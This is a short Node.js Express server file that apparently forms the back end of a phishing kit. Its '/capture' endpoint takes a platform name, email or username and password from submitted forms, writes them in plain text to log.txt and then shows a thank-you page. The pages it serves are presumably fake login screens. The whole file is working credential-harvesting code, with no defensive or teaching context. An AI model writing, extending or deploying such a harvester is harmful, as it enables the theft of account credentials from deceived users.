const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.post('/capture', (req, res) => {
  const { platform, email, password } = req.body;
  const log = `Platform: ${platform} | Email/User: ${email} | Password: ${password}\n`;
  fs.appendFileSync('log.txt', log);
  res.sendFile(path.join(__dirname, 'thankyou.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running at http://localhost:${PORT}`));
